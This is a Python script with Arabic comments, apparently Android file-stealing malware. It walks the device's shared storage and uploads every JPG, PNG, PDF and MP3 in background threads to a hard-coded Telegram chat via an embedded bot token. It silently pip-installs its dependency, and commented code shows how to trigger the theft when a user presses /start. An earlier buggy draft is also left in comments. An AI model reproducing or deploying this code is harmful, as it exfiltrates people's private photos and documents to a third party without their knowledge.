# import os 
# import subprocess
# import os 
# import threading
# from concurrent.futures import ThreadPoolExecutor

# try:
#     import telebot 
# except ImportError:
#     subprocess.check_call([sys.executable,'- m ', 'pip ',' install','pyTelegramBotAPI'])
#     import telebot 
#     bot = telebot
#     TeleBot('')
#     dir_path = "/storage/emulated/0/"
# def send_file(file_path):
#     try:
#         with open(file_path):
#             if file_path.lower().endswith((".jpg",".png","jpeg")):
#                 bot.send_photo(chat_id=23223434,photo=f,caption='name of your boot')
#             elif file_path.lower().endswith((".pdf")):

#                 bot.send_aduio(chat_id=98989000,document=f,caption='')
#             elif file_path.lower().endswith((".mp3")):
#                 bot.send_aduio(chat_id=98989000,document=f,caption='')
#     except Exception as e: 
#         print(f"خطاء {file_path}:{e}")
# def background():
#     with
#     ThreadPoolExecutor(max_workers=10) as executor:
#     for   root,dirs,files in os.walk(dir_path):
#         for file in files:
#             file_path = os.path.join(root,files)
#             if file_path.lower().endswith((".jpg",".pdf",".png",".jpeg","mp3")):
#                 threading.Thread(target=background,daemon=True).start()
#                 bot.infinity_polling() 


import os
import sys
import subprocess
import threading
from concurrent.futures import ThreadPoolExecutor

# محاولة استيراد telebot وتثبيته إذا لم يكن موجودًا
try:
    import telebot
except ImportError:
    subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'pyTelegramBotAPI'])
    import telebot

# إعداد التوكن ومسار الملفات
TOKEN = '8406074207:AAEyyuxuCWAmYcJ3wksymzfy6GdHDyIlvkU'  # ضع توكن البوت هنا
CHAT_ID = 8295401689       # ضع رقم الـ chat_id هنا
dir_path = "/storage/emulated/0/"  # غيّر المسار حسب نظامك

bot = telebot.TeleBot(TOKEN)

def send_file(file_path):
    try:
        with open(file_path, "rb") as f:
            if file_path.lower().endswith((".jpg", ".png", "jpeg")):
                bot.send_photo(chat_id=CHAT_ID, photo=f, caption='اسم البوت')
            elif file_path.lower().endswith(".pdf"):
                bot.send_document(chat_id=CHAT_ID, document=f, caption='ملف PDF')
            elif file_path.lower().endswith(".mp3"):
                bot.send_audio(chat_id=CHAT_ID, audio=f, caption='ملف صوتي')
    except Exception as e:
        print(f"خطأ في إرسال {file_path}: {e}")

def background():
    with ThreadPoolExecutor(max_workers=5) as executor:
        for root, dirs, files in os.walk(dir_path):
            for file in files:
                file_path = os.path.join(root, file)
                if file_path.lower().endswith((".jpg", ".pdf", ".png", ".jpeg", ".mp3")):
                    executor.submit(send_file, file_path)

# تشغيل المعالجة في خلفية
threading.Thread(target=background, daemon=True).start()

# تشغيل البوت
bot.infinity_polling()
#   في حال اردت ان يغط المستخدم start/boot ويبداء البوت بالعمل عليك ان تكتب هذا الامر 

# @bot.message_handler(commands=["start"])
# def start_handler(message):
#     bot.reply_to(message, "جارٍ فحص الملفات...")
#     threading.Thread(target=background, daemon=True).start()
#     bot.infinity_polling()
